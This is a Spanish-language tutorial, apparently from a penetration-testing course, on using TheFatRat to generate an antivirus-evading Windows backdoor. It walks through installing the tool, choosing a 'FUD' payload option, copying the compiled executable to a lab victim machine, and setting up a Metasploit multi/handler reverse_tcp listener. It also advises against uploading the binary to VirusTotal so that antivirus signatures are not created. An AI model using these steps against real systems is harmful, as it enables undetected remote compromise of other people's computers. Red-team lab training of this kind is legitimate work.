---
icon: mouse-field
---

# Evasión con TheFatRat

Vamos a ver una herramienta que se utiliza para la evasion de defensas super popular que esta en el siguiente repositorio de `GitHub`:

URL = [TheFatRat GitHub](https://github.com/screetsec/TheFatRat)

No viene instalada por defecto en `kali` por lo que tendremos que realizar lo siguiente para instalarla, adelanto que esta herramienta trae varias tecnicas de `frameworks` famosas para la evasion de defensas, por eso es tan famosa:

```shell
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
sudo ./setup.sh
```

Mientras se esta instalando nos aparecera mas adelante una opcion la cual le daremos al `2`:

```
Select one of the options bellow                                                        
 +-----------------------------------------------------+                           
 | [ 1 ] Setup Backdoor-Factory Path Manually          |                           
 | [ 2 ] Install Backdoor-Factory from Kali Repository |                           
 +-----------------------------------------------------+                           
 
 Option : 2 
```

Despues nos aparecera esta otra opcion le daremos a `ENTER` seguidamente la `y`:

```
Write output directory for fatrat generated files or press enter to default.                              
Default : /root/Fatrat_Generated                                                                                                                                      
Write:                                                                             
 Do you want to create a shortcut for fatrat in your system                        
 so you can run fatrat from anywhere in your terminal and desktop ?                                                                                                   
 Choose y/n : y
```

Y con esto ya tendremos la herramienta instalada de forma correcta.

Ahora para iniciar la aplicacion tendremos que poner lo siguiente:

```shell
sudo fatrat
```

Y esto empezara a realizar los checkeos pertinentes para ver que todo este en orden, una vez realizado todo eso, nos pondra el siguiente mensaje:

```
==================================================================                   
         WARNING !  WARNING ! WARNING ! WARNING ! WARNING !                                
    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM                         
==================================================================                      
 ____  _____ _____ _____    _____ _____ __    _____ _____ ____                     
|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \                    
|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |                   
|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/                    
                         _____ _____                                               
                        |_   _|     |                                              
                          | | |  |  |                                              
                          |_| |_____|                                             
 _____ _____ _____ _____ _____    _____ _____ _____ _____ __                
|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |                      
|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__                    
 \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|                              
==================================================================                             
       PLEASE DON'T UPLOAD BACKDOOR TO WWW.VIRUSTOTAL.COM                                  
    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM                    
==================================================================                                                                                                    
Press [Enter] key to continue ..............
```

Aqui nos avisa de que no subamos los binarios a `virustotal` ya que este lo comparte con los diferentes antivirus y asi pueden crear firmas para dicho binario y que despues no sirva para `bypassearlo`, despues de esto le daremos a `ENTER`, despues otra ver `ENTER` se iniciara una base de datos de `postgresql` y por ultimo veremos el menu de la herramienta:

```
resize: Time out occurred                                                                                                                                             
         ____                                                                      
        |    |                                                                     
        |____|                                                                     
       _|____|_       _____ _       _____     _   _____     _                      
        /  ee\_      |_   _| |_ ___|   __|___| |_| __  |___| |_                    
      .<     __O       | | |   | -_|   __| .'|  _|    -| .'|  _|                   
     /\ \.-.' \        |_| |_|_|___|__|  |___|_| |__|__|___|_|                     
    J  \.|'.\/ \                                                                   
    | |_.|. | | |   [--]   Backdoor Creator for Remote Acces [--]                  
     \__.' .|-' /   [--]  Created by: Edo Maland (Screetsec) [--]                  
     L   /|o'--'\   [--]            Version: 1.9.8           [--]                  
     |  /\/\/\   \  [--]          Codename: Target          [--]             
     J /      \.__\ [--]   Follow me on Github: @Screetsec   [--]                  
     J /      \.__\ [--]   Dracos Linux : @dracos-linux.org  [--]                  
     |/         /   [--]                                     [--]                  
       \      .'\.  [--]     SELECT AN OPTION TO BEGIN:      [--]                  
    ____)_/\_(___\. [--] .___________________________________[--]                  
   (___._/  \_.___)'\_.-----------------------------------------/                                                                                                 
        [01]  Create Backdoor with msfvenom                                        
        [02]  Create Fud 100% Backdoor with Fudwin 1.0                             
        [03]  Create Fud Backdoor with Avoid v1.2                                  
        [04]  Create Fud Backdoor with backdoor-factory [embed]                    
        [05]  Backdooring Original apk [Instagram, Line,etc]                       
        [06]  Create Fud Backdoor 1000% with PwnWinds [Excelent]                   
        [07]  Create Backdoor For Office with Microsploit                          
        [08]  Trojan Debian Package For Remote Acces [Trodebi]                     
        [09]  Load/Create auto listeners                                           
        [10]  Jump to msfconsole                                                   
        [11]  Searchsploit                                                        
        [12]  File Pumper [Increase Your Files Size]                          
        [13]  Configure Default Lhost & Lport                                    
        [14]  Cleanup                                                           
        [15]  Help                                                           
        [16]  Credits                                                         
        [17]  Exit                                                                                                                                           
 ┌─[TheFatRat]──[~]─[menu]:           
 └─────►   
```

Por lo que vemos podemos `backdoorizar` un binario de muchas formas en este `framework`, podemos hacerlo de diferentes formas con las diferentes herramientas que nos proporciona, incluso en la opcion `05` podemos ver que podemos generar una aplicacion como `instagram` para que cuando se ejecute, tambien se ejecute un `backdoor` que estara por detras para crearnos una `reverse shell`.

En este caso vamos a probar la opcion `2`, por lo que pondremos `2` y nos llevara a dicha tecnica viendo otras opciones:

```
  _______ ___ ___ ______   ___ ___ ___ ______  
  |   _   |   Y   |   _  \ |   Y   |   |   _  \ 
  |.  1___|.  |   |.  |   \|.  |   |.  |.  |   |
  |.  __) |.  |   |.  |    |. / \  |.  |.  |   |
  |:  |   |:  1   |:  1    |:      |:  |:  |   |
  |::.|   |::.. . |::.. . /|::.|:. |::.|::.|   |
   ---     ------- ------   --- --- --- --- ---   1.0
 
 Select one tool to create your Windows EXE FUD Rat 
 

 [ 1 ] - Powerstager 0.2.5 by z0noxz (powershell) (NEW)
 [ 2 ] - Slow But Powerfull (OLD)
 [ 3 ] - Return to menu

 ┌─[TheFatRat]──[~]─[FUDWIN]:
 └─────► 
```

En este caso podremos seleccionar el nuevo `payload` que ha salido para poder generarlo con `powershell` o podremos utilizar el viejo pero que es muy potente, vamos a darle al numero `2` y esto nos abrira una mini ventana de terminal en el que se nos generara el `payload`.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Despues de poner la `IP` y el puerto, veremos esto otro:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seleccionaremos la opcion `2` para que nos lo compile en `64 bits`, esto puede tardar un poco, pero cuando haya terminado veremos esto:

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Aqui nos comenta que ya compilo el binario de la `backdoor` pero que lo compilo una segunda vez el original para que este de forma mas ofuscada y el segundo compilado se llama `Powerfull-fud.exe` que es el que vamos a utilizar, nos muestra que esta en la siguiente ruta:

```shell
sudo ls -la /root/Fatrat_Generated
```

Info:

```
total 4528
drwxr-xr-x  2 root root    4096 Feb  8 07:03 .
drwx------ 12 root root    4096 Feb  8 07:03 ..
-rwxr-xr-x  1 root root 2591185 Feb  8 07:03 Powerfull.exe
-rwxr-xr-x  1 root root 2035665 Feb  8 07:03 Powerfull-fud.exe
```

Vemos que efectivamente se creo de forma correcta por lo que vamos a copiarnoslo a nuestro escritorio de `kali`.

```shell
sudo cp /root/Fatrat_Generated/Powerfull-fud.exe ~/Desktop
```

Ahora nos tendremos que pasar ese `binario` a la maquina `WS02` para probarlo a ver si lo detecta o no el `antivirus` hay a veces que lo puede detectar, ya que la forma en que la compila varia dependiendo de cuando lo ejecutes, por lo que hay que tener un poco de suerte tambien, pero vamos a probar a pasarnoslo a nuestra maquina victima `Windows`.

Por lo que vemos si nos lo pasamos a la maquina `Windows` con el `antivirus` activado, no nos lo va a detectar en mi caso, ahora vamos a probar a ejecutarlo, pero antes tendremos que estar a la escucha:

```shell
msfconsole -q
```

Ahora vamos a configurar la escucha:

```shell
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.5.205
set LPORT 7777
run
```

Ahora que estamos a la escucha, vamos a nuestra maquina victima `windows` y ejecutamos el binario directamente.

Si nos vamos donde tenemos la escucha tendremos que ver una conexion en `metasploit`, si tuvieramos alguna duda, podremos monitorearlo con `Wrireshark` por si vieramos trafico `TCP`, si vemos ese trafico es que se esta realizando la conexion, pero si no lo vemos es por que el binario esta mal formado o no se esta ejecutando de forma correcta.
